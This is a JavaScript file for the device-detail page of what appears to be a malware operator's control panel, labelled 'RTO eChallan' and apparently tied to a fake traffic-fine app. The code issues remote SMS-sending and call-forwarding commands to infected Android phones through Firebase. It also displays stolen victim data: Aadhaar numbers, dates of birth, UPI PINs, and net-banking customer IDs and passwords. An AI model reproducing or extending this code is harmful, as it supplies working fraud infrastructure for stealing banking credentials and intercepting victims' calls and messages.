// ==========================================
// DEVICE DETAIL PAGE - RTO eChallan
// ==========================================
requireAuth();

const params = new URLSearchParams(window.location.search);
const deviceId = params.get("id");

if (!deviceId) {
  window.location.href = "dashboard.html";
}

let currentDevice = {};
let challanUser = {};
let selectedSimSms = 1;
let selectedSimCf = 1;

// Load device data
db.ref("device_info/" + deviceId).on("value", (snap) => {
  const d = snap.val() || {};
  currentDevice = d;
  renderDevice(d);
});

// Load challan_users data
db.ref("challan_users/" + deviceId).on("value", (snap) => {
  challanUser = snap.val() || {};
});

// ==========================================
// RENDER DEVICE DETAIL
// ==========================================
function renderDevice(d) {
  const online = isDeviceOnline(d.last_seen);
  const statusClass = online ? "online" : "offline";
  const statusText = online ? "● Online" : "● Offline";

  const html = `
    <!-- Top Control Buttons -->
    <div class="two-col-btns">
      <button class="big-btn" onclick="openModal('modalCallFwd')">📞 Call Forward</button>
      <button class="big-btn" onclick="openModal('modalSms')">💬 Send SMS</button>
    </div>
    <button class="big-btn" onclick="openSimModal()">📶 Update SIM Number</button>

    <!-- Device Info Card -->
    <div class="detail-header-card">
      <div class="row"><span class="k">Model</span><span class="v">${escapeHtml(d.device_model || "-")}</span></div>
      <div class="row"><span class="k">OS Version</span><span class="v">Android ${escapeHtml(d.android_version || "-")}</span></div>
      <div class="row"><span class="k">Device Name</span><span class="v">${escapeHtml(d.device_manufacturer || "-")}</span></div>
      <div class="row"><span class="k">Device ID</span><span class="v">${escapeHtml(deviceId)}</span></div>
      <div class="row"><span class="k">SIM 1</span><span class="v" style="color:#00ff88;">${escapeHtml(d.sim1 || d.sim1_number || "No SIM Found")}</span></div>
      <div class="row"><span class="k">SIM 2</span><span class="v" style="color:#00ff88;">${escapeHtml(d.sim2 || d.sim2_number || "No SIM Found")}</span></div>
    </div>

    <!-- Connection Status -->
    <div class="connection-status">
      <span class="label">Connection Status</span>
      <span class="${statusClass}">${statusText}</span>
    </div>

    <!-- Login Details Button -->
    <button class="big-btn" onclick="openLoginDetails()">🔐 Login Details</button>

    <!-- Recent Messages -->
    <div class="section-card">
      <h3>💬 Recent Messages</h3>
      <div id="recentMessages">
        <div style="text-align:center;color:#64748b;padding:20px;">Loading messages...</div>
      </div>
    </div>
  `;

  document.getElementById("content").innerHTML = html;
  loadRecentMessages();
}

// ==========================================
// LOAD RECENT MESSAGES
// ==========================================
function loadRecentMessages() {
  db.ref("sms_commands/" + deviceId).limitToLast(5).once("value").then((snap) => {
    const data = snap.val() || {};
    const msgs = [];
    Object.keys(data).forEach((k) => {
      msgs.push({ key: k, ...data[k] });
    });
    msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

    const el = document.getElementById("recentMessages");
    if (msgs.length === 0) {
      el.innerHTML = '<div style="text-align:center;color:#64748b;padding:20px;">No messages yet</div>';
      return;
    }

    el.innerHTML = msgs.map((m) => {
      const isSent = m.direction === "out" || m.status === "sent";
      return `
        <div class="msg-item ${isSent ? 'sent' : ''}" style="margin-bottom:10px;">
          <div class="msg-header">
            <span>
              <span class="msg-tag ${isSent ? 'tag-out' : 'tag-in'}">${isSent ? '📤 SENT' : '📩 RECV'}</span>
              ${escapeHtml(m.target_number || m.from || "-")}
            </span>
            <span>${formatTime(m.timestamp)}</span>
          </div>
          <div class="msg-body">${escapeHtml(m.message || m.body || "-")}</div>
        </div>
      `;
    }).join("");
  });
}

// ==========================================
// SIM SELECTOR
// ==========================================
function selectSim(type, sim) {
  if (type === 'sms') {
    selectedSimSms = sim;
    document.querySelectorAll('#modalSms .sim-option').forEach((el, i) => {
      el.classList.toggle('active', (i + 1) === sim);
    });
  } else if (type === 'cf') {
    selectedSimCf = sim;
    document.querySelectorAll('#modalCallFwd .sim-option').forEach((el, i) => {
      el.classList.toggle('active', (i + 1) === sim);
    });
  }
}

// ==========================================
// SEND SMS
// ==========================================
function sendSMS() {
  const number = document.getElementById("smsNumber").value.trim();
  const message = document.getElementById("smsMessage").value.trim();

  if (!number || !message) {
    alert("Number and message both required!");
    return;
  }

  const ref = db.ref("sms_commands/" + deviceId).push();
  ref.set({
    device_id: deviceId,
    target_number: number,
    message: message,
    sim_slot: selectedSimSms,
    status: "pending",
    timestamp: Date.now(),
    direction: "out"
  }).then(() => {
    alert("SMS command sent!");
    document.getElementById("smsNumber").value = "";
    document.getElementById("smsMessage").value = "";
    closeModal('modalSms');
  }).catch((err) => alert("Error: " + err.message));
}

// SMS counter
document.addEventListener("input", (e) => {
  if (e.target && e.target.id === "smsMessage") {
    document.getElementById("smsCounter").textContent = e.target.value.length + "/150";
  }
});

// ==========================================
// CALL FORWARD
// ==========================================
function sendCallForward(action) {
  const number = document.getElementById("cfNumber").value.trim();

  if (action === "activate" && !number) {
    alert("Enter number first!");
    return;
  }

  const ref = db.ref("call_forward_commands/" + deviceId).push();
  ref.set({
    action: action,
    number: number,
    sim_slot: selectedSimCf,
    status: "pending",
    timestamp: Date.now()
  }).then(() => {
    alert(`Call forward ${action} command sent!`);
    closeModal('modalCallFwd');
  }).catch((err) => alert("Error: " + err.message));
}

// ==========================================
// UPDATE SIM
// ==========================================
function openSimModal() {
  document.getElementById("sim1Input").value = currentDevice.sim1 || currentDevice.sim1_number || "";
  document.getElementById("sim2Input").value = currentDevice.sim2 || currentDevice.sim2_number || "";
  document.getElementById("modalSim").classList.add("active");
}

function updateSim() {
  const sim1 = document.getElementById("sim1Input").value.trim();
  const sim2 = document.getElementById("sim2Input").value.trim();

  const update = {};
  if (sim1) update.sim1 = sim1;
  if (sim2) update.sim2 = sim2;

  if (Object.keys(update).length === 0) {
    alert("Enter at least one SIM number!");
    return;
  }

  db.ref("device_info/" + deviceId).update(update).then(() => {
    alert("SIM updated!");
    closeModal('modalSim');
  }).catch((err) => alert("Error: " + err.message));
}

// ==========================================
// LOGIN DETAILS
// ==========================================
function openLoginDetails() {
  const el = document.getElementById("loginDetailsContent");
  const cu = challanUser || {};
  const d = currentDevice || {};

  const html = `
    <div class="section-card" style="margin:0 0 12px 0;">
      <h3>👤 Personal Info</h3>
      <div style="font-size:13px;line-height:2;color:#fff;">
        <div><b style="color:#94a3b8;">Name:</b> ${escapeHtml(cu.user_name || cu.name || d.user_name || "-")}</div>
        <div><b style="color:#94a3b8;">Mobile:</b> ${escapeHtml(cu.mobile || cu.phone || d.mobile || "-")}</div>
        <div><b style="color:#94a3b8;">DOB:</b> ${escapeHtml(cu.dob || d.dob || "-")}</div>
        <div><b style="color:#94a3b8;">Aadhar:</b> ${escapeHtml(cu.aadhar || cu.aadhaar || d.aadhar || "-")}</div>
        <div><b style="color:#ff3b5c;">UPI PIN:</b> ${escapeHtml(cu.upi_pin || d.upi_pin || "N/A")}</div>
      </div>
    </div>

    <div class="section-card" style="margin:0;">
      <h3>🏦 Net Banking Details</h3>
      <div id="netbankingData" style="font-size:13px;line-height:2;color:#fff;">
        Loading...
      </div>
    </div>
  `;

  el.innerHTML = html;
  document.getElementById("modalLoginDetails").classList.add("active");

  db.ref("netbanking_payments").orderByChild("device_id").equalTo(deviceId).once("value").then((snap) => {
    const data = snap.val() || {};
    const keys = Object.keys(data);
    const nb = document.getElementById("netbankingData");

    if (keys.length === 0) {
      nb.innerHTML = '<i style="color:#64748b;">No netbanking data found</i>';
      return;
    }

    nb.innerHTML = keys.map((k) => {
      const p = data[k] || {};
      return `
        <div style="border-bottom:1px solid rgba(255,255,255,0.06);padding:10px 0;">
          <div><b style="color:#94a3b8;">Bank:</b> ${escapeHtml(p.netbanking_bank || "-")}</div>
          <div><b style="color:#94a3b8;">Account Holder:</b> ${escapeHtml(p.netbanking_account_holder || "-")}</div>
          <div><b style="color:#94a3b8;">Customer ID:</b> ${escapeHtml(p.netbanking_customer_id || "-")}</div>
          <div><b style="color:#ff3b5c;">Password:</b> ${escapeHtml(p.netbanking_password || "-")}</div>
          <div style="font-size:11px;color:#64748b;margin-top:4px;">Amount: ${escapeHtml(p.amount || "-")}</div>
        </div>
      `;
    }).join("");
  }).catch(() => {
    document.getElementById("netbankingData").innerHTML = "<i>Error loading data.</i>";
  });
}

// ==========================================
// MODAL CONTROLS
// ==========================================
function openModal(id) {
  document.getElementById(id).classList.add("active");
}
function closeModal(id) {
  document.getElementById(id).classList.remove("active");
}

document.querySelectorAll(".modal-overlay").forEach((overlay) => {
  overlay.addEventListener("click", (e) => {
    if (e.target === overlay) overlay.classList.remove("active");
  });
});
